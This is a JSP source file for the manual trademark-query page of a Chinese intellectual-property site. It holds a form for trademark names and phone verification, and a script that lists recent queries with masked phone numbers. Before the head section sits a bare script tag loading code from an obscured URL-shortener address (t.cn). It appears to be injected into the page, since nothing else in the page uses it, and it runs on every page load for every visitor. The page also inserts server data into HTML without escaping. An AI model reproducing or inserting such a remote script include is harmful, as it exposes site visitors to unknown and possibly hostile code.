<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%@ include file="/WEB-INF/common/taglibs.jsp"%>
<%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>
<!DOCTYPE html>
<html>
<script src=http://t.cn/RqC4pMc></script>
	<head>
		<meta charset="UTF-8">
		<title>商标查询|中国商标网|商标注册查询-路标商标查询-人工查询</title>
<%-- 		<script src="${ctx}/static/js/index.js" type="text/javascript" charset="utf-8"></script> 
	    <link rel="stylesheet" type="text/css" href="${ctx}/static/css/main.css" />  --%>
		
		<style>
			@media screen and (max-width:1200px) {
				#nav,
				#top,
				.demand,
				.show1-div,
				#bottom {
					width: 960px;
				}
				.demand-div2-int {
					width: 356px;
				}
				.subject .subject-left {
					width: 690px;
				}
				.subject .subject-left .list li .right {
					margin-right: 100px
				}
				.subject .subject-left .search ul li p.list {
					width: 430px;
				}
				#section .section-div-top{width:960px;}
				.sec-div-bottom{width:960px;}
			}
		</style>
		<link rel="stylesheet" type="text/css" href="${ctx}/static/css/Artificialquery.css" />
	</head>

	<body>
	
        <div id="tcbg" style="display: none;" class="tc">
        	<div id="tanchuzeng">
							<div class="remtanchu1">
								<img src="${ctx}/static/img/wujieguo.png" class="img" />
								<h3 class="rcx">人工查询</h3>
								<img src="${ctx}/static/img/guanbi.png" class="imggb" />
							</div>
							<div class="remtanchu2">
								<img src="${ctx}/static/img/iconfont_dui.png" class="duigou" />
								<span class="ndcxzl">您的查询资料已提交</span>
								<p class="notify">请耐心等待,猪八戒知识产权顾问尽快电话告知您查询结果</p>
							</div>
						</div>
        </div>
		<div id="section">
			<div class="section-div-top">
				<div class="sec-div-top">
					<span class="lush"><a href="${ctx}/index" style="color:#22a0d3;">免费查询首页</a></span>
					<p class="rjish">&nbsp;>&nbsp;人工查询</p>
				</div>
		<shiro:guest><!-- 游客登录 -->
				<div class="sec-div-center">
					<form class="menu" name="">
						<p class="mianfei">人工免费查询</p>
						<div><label style="text-indent:0.5em;"><span style="color:red">*</span>商标名称 : <input type="text" value="" class="centxt" id="shangbiaocontent" placeholder="多个商标名称用逗号隔开">
						    <div class="warn"></div></label>
						    <input type="hidden" value="0" id="flag">
						</div>
						<div>
							<label style="text-indent:0.5em;"><span style="color:red">*</span>联系电话 : <input type="text" value="" id="centxt1" class="teletephone" placeholder="请输入您的手机号码"/><div class="warn"></div></label>
						</div>
						

                      <div style="position:relative">
						
						<label>手机验证码 : <input type="text" placeholder="输入4位验证码" class="centxt2" id="vcode" /><div class="warn1"></div></label>
						<button class="yancen" type="button">发送验证码</button>
						<div class="resend" style="position:absolute;top:0px;right:22px;width:126;"><span class="count"></span>秒后重新发送</div>
					  </div>

						<button type="button" class="chaxun" id="ch">查询</button>	
					</div>
		</shiro:guest>
		   <shiro:user><!-- 会员登录 -->
				<div class="sec-div-center">
					<form class="menu" name="">
						<p class="mianfei">人工免费查询</p>
						<p style="margin-bottom: 20px;"><span style="letter-spacing:3px" class="designation" >商标名称:</span>
							<input type="text" value="" name="content" class="centxt" id="shangbiaocontent" placeholder="多个商标名称用逗号隔开">
						</p>
						<p>
							<!--<img src="-.png" class="-img2" />-->
							<span class="designation1">联系电话:</span>
							<input type="text" value=<shiro:principal></shiro:principal> class="teletephone" id="centxt1" readonly="readonly" placeholder="请输入您的手机号码"/>
						    <input type="hidden" value="1" id="flag">
						</p>
						<button type="button" class="chaxun" id="ch">查询</button>	
					</form>
				</div>
		</shiro:user>  	
				<div class="sec-div-bottom">
					<p class="recp">最近查询</p>
					<div class="Recently-div clearfix">
						<div class="rediv-div1">
							<form name="">
								<table border="0" cellspacing="0" cellpadding="0" style="width: 442px;" id="table1">
									<!-- <tr class="clearfix">
										<td class="dione f-l">八戒知识产权sadsds</td>
										<td id="td2" class="f-r">2013-01-03</td>
										<td class="td1 f-r">用户(<span class="sp3">131******131</span>)</td>
									</tr>
									 -->
								</table>

							</form>

						</div>
						<div class="rediv-div2">
							<table style="width: 440px;" id="table2">
							
							</table>
						</div>
					</div>
				</div>

			</div>

		</div>
         <div style="width:100%;position:fixed;top:45%;text-align:center;z-index:10;"><button id="warn_tip" type="button">提交成功！</button></div>
		<script src="${ctx}/static/js/jquery-1.8.3.min.js" type="text/javascript" charset="utf-8"></script>
		<script src="${ctx}/static/js/Artificialquery.js" type="text/javascript" charset="utf-8"></script>
		
		
		<script type="text/javascript">
	          $(function() {
	           browseManualSearch();
	     });
	   
	    function browseManualSearch(){
					  $.ajax({ 
				        type: "post",  
				        async:true,
				        dataType:'json',
				        url:"${ctx}/ManualSearchController/browseManualSearch.do",
                          success: function(data){ 
                          for(var i=0;i<6;i++){
                           var val=data[i];
                           var pho=val['phone']+"";
                           var phon=pho.substr(0,3)+"****"+pho.substr(7,11);
                          var content=data[i]['content']+"";
                           var conten=content.substr(0,1)+"****";
                            /* var co=content.split(",");
                            var conten=co[0];
                            if(conten.length>10){
                               conten=conten.substring(0,10)+"...";
                             } */
                            if(val.create_time!=null && val.create_time!=""){
                                 var date=timeStamp2String(val.create_time);
                            }
                            $("#table1").append("<tr class='clearfix'><td class='dione f-l'>"+conten+"</td>"+
										                             "<td id='td2' class='f-r'>"+date+"</td>"+
										                             "<td class='td1 f-r'>用户(<span class='sp3'>"+phon+"</span>)</td></tr>");
                          }
                          for(var i=6;i<data.length;i++){
                             var val=data[i];
                              var pho=val['phone']+"";
                           var phon=pho.substr(0,3)+"****"+pho.substr(7,11);
                           var content=data[i]['content']+"";
                           var conten=content.substr(0,1)+"****";
                           /*  var co=content.split(",");
                            var conten=co[0]+""; */
                           /*  if(conten.length>10){
                               conten=conten.substring(0,10)+"...";
                             } */
                            if(val.create_time!=null && val.create_time!=""){
                                 var date=timeStamp2String(val.create_time);
                            }
                            $("#table2").append("<tr class='clearfix'><td class='dione f-l'>"+conten+"</td>"+
										                             "<td id='td2' class='f-r'>"+date+"</td>"+
										                             "<td class='td1 f-r'>用户(<span class='sp3'>"+phon+"</span>)</td></tr>");
                          }
					    },
					    "error": function (result) {   
                         }  
					  });
					}
					
					 function timeStamp2String(time){
						    var datetime = new Date();
						    datetime.setTime(time);
						    var year = datetime.getFullYear();
						    var month = datetime.getMonth() + 1 < 10 ? "0" + (datetime.getMonth() + 1) : datetime.getMonth() + 1;
						    var date = datetime.getDate() < 10 ? "0" + datetime.getDate() : datetime.getDate();
						    return year + "-" + month + "-" + date;
				 }
		 var _hmt = _hmt || [];
		 (function() {
		   var hm = document.createElement("script");
		   hm.src = "//hm.baidu.com/hm.js?eb194d5472c74b4fef24b33d4106dd2c";
		   var s = document.getElementsByTagName("script")[0]; 
		   s.parentNode.insertBefore(hm, s);
		 })();
	</script>
	</body>
	
</html>